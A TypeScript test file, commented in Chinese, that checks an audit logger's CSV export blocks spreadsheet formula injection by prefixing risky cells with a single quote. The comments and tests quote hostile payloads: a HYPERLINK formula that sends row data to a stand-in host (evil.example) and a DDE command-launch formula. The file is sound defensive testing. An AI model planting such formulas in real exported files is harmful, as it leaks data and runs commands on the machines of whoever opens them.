/**
 * 审计 CSV 导出的格子还必须**挡住公式注入**（OWASP "CSV Injection"），而不只是挡分隔符。
 *
 * Excel ∕ LibreOffice ∕ Sheets 会把**首字符**是 `=` `+` `-` `@`（以及前导 tab ∕ CR）的格子
 * 当成公式**在打开文件的那一刻求值**：`=HYPERLINK("http://evil/?"&A1,"x")` 把整行外带，
 * 经典的 `=cmd|'/C calc'!A0`（DDE）直接起进程。RFC 4180 的加引号**挡不住**它 ——
 * 表格软件会脱掉引号再求值 —— 唯一的诚实挡法是前导 `'`（表格软件读作「其余是文本」并隐藏它）。
 *
 * 可达性：`resourceName` 是**原样的**快捷指令名（`validateShortcutName` 只查非空 ∕ 长度），
 * `errorMessage` 是任意错误文本，两者都没有前缀；`eventDescription` 恰好以「执行快捷指令: 」
 * 开头，所以真正活的向量是**资源列**，而不是描述列 —— 一个只盯着描述的实现会把它漏掉。
 *
 * 判据：同一方法里两句都成立 —— 表格软件读到的文本必须仍是那条记录；而 RFC 4180 的
 * 引号规则必须**照旧**只对含分隔符 ∕ 引号 ∕ 换行的格子生效（正控）。
 */
import { describe, test as it, expect, beforeEach, afterEach } from "bun:test";
import { auditLogger } from "../enterprise/audit";

beforeEach(() => {
  auditLogger.clearAllLogs();
  auditLogger.updateConfig({ bufferSize: 1000 });
});

afterEach(() => {
  auditLogger.clearAllLogs();
});

/** 与 REQ-A1540 那份同源的最小 RFC 4180 读取器（认识引号里的换行）。 */
function splitCsv(csv: string): string[][] {
  const records: string[][] = [];
  let row: string[] = [];
  let cur = "";
  let inQuotes = false;
  for (let i = 0; i < csv.length; i++) {
    const c = csv[i]!;
    if (inQuotes) {
      if (c === '"') {
        if (csv[i + 1] === '"') {
          cur += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        cur += c;
      }
    } else if (c === '"') {
      inQuotes = true;
    } else if (c === ",") {
      row.push(cur);
      cur = "";
    } else if (c === "\n") {
      row.push(cur);
      cur = "";
      records.push(row);
      row = [];
    } else {
      cur += c;
    }
  }
  row.push(cur);
  records.push(row);
  return records;
}

async function writeOne(
  description: string,
  resourceName?: string,
  errorMessage?: string,
): Promise<string> {
  await auditLogger.log({
    eventType: "shortcut_execute",
    eventCategory: "execution",
    eventDescription: description,
    resourceName,
    errorMessage,
    result: "success",
  });
  await auditLogger.flushBuffer();
  return auditLogger.exportLogs({}, "csv");
}

/** 第 1 条数据记录（records[0] 是表头）。 */
async function rowOf(...args: Parameters<typeof writeOne>): Promise<string[]> {
  return splitCsv(await writeOne(...args))[1]!;
}

describe("REQ-A1556 — 审计 CSV 导出的格子挡住公式注入", () => {
  it("资源名以 `=` 开头（快捷指令名合法）⇒ 导出格不被表格软件当公式求值", async () => {
    const data = await rowOf("执行快捷指令: 日常", "=1+1");

    // 资源列（第 6 列）是原样名字，没有前缀 —— 修前这里逐字是 `=1+1`，一个活的公式。
    expect(data[5]).toBe("'=1+1");
    expect(data[5]!.startsWith("=")).toBe(false);
    // 列数不变，其余列仍在自己位置上。
    expect(data).toHaveLength(9);
    expect(data[6]).toBe("success");
  });

  it("错误信息里的 HYPERLINK 载荷被挡下（同一族的第二个自由文本列）", async () => {
    const data = await rowOf(
      "执行快捷指令: 日常",
      "日常",
      '=HYPERLINK("http://evil.example/?"&A1,"点我")',
    );

    // 错误列（第 8 列）。
    expect(data[7]!.startsWith("=")).toBe(false);
    expect(data[7]!).toBe('\'=HYPERLINK("http://evil.example/?"&A1,"点我")');
    expect(data).toHaveLength(9);
  });

  it("`+` `-` `@` 与前导 tab ∕ CR 也都挡下（Excel 视为公式的全部首字符）", async () => {
    for (const payload of ["+1+1", "-1+1", "@SUM(1+1)", "\tcmd", "\rcmd"]) {
      // `exportLogs` 导出的是整份匹配集：不清空的话第 2 轮读到的还是第 1 轮那行。
      auditLogger.clearAllLogs();
      const data = await rowOf("执行快捷指令: 日常", payload);
      expect(data[5]!.startsWith("'")).toBe(true);
      expect(data[5]).not.toBe(payload);
      expect(data[5]).toHaveLength(payload.length + 1);
    }
  });

  it("描述列同样受这条规则保护（规则在单元格上，不在某一列上）", async () => {
    const data = await rowOf("=1+1");
    expect(data[4]).toBe("'=1+1");
  });

  it("挡法与 RFC 4180 组合：含逗号的公式载荷既被挡下又被加引号", async () => {
    const csv = await writeOne("执行快捷指令: 日常", "=a,b");
    const data = splitCsv(csv)[1]!;

    // 加引号（因为有逗号），且引号内的首字符已被 `'` 挡下 —— 读取器读回的是 `'=a,b`。
    expect(data[5]).toBe("'=a,b");
    expect(data).toHaveLength(9);
    // 物理行上确实带了引号包裹。
    expect(csv.split("\n")[1]!).toContain('"\'=a,b"');
  });

  it("正控 · `=` 不在首位的普通文本一字未改（规则没有过度改写）", async () => {
    const data = await rowOf("执行快捷指令: a=b", "日常=b");

    expect(data[4]).toBe("执行快捷指令: a=b");
    expect(data[5]).toBe("日常=b");
  });

  it("正控 · 普通标题行与普通数据行都不加 `'`（没有被无差别改写）", async () => {
    const csv = await writeOne("普通描述", "普通资源");
    const records = splitCsv(csv);

    expect(records[0]![5]).toBe("资源"); // 表头原样
    expect(records[1]![5]).toBe("普通资源");
    expect(csv).not.toContain("'");
  });
});
